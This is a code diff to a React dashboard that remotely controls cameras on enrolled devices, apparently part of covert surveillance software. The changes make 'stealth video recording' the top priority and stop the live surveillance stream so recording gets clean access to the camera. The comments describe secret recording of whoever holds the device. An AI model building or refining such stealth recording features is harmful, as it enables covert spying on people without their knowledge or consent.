@@ -364,12 +364,12 @@ export function DashboardProvider({ children }) {
     if (!device) return;
 
     if (actionType === "live") {
+      // Start live surveillance stream preview
       handleStartLiveStream(device, camera);
     } else {
-      // 1. Start stealth video recording on device (saved to disk/Drive)
+      // Video Recording is #1 TOP PRIORITY:
+      // Start pure, dedicated stealth recording without competing live stream socket request
       handleStartRemoteRecording(device.deviceId, camera);
-      // 2. Automatically open live surveillance window so admin can preview in real-time
-      handleStartLiveStream(device, camera);
     }
   };
 
@@ -379,7 +379,11 @@ export function DashboardProvider({ children }) {
     if (currentDevice.isRecording) {
       handleStopRemoteRecording(liveDevice.deviceId);
     } else {
-      handleStartRemoteRecording(liveDevice.deviceId, liveLens || "BACK");
+      const devId = liveDevice.deviceId;
+      const lens = liveLens || "BACK";
+      // Hand over camera hardware cleanly to video recording
+      handleStopLiveStream();
+      handleStartRemoteRecording(devId, lens);
     }
   };
 
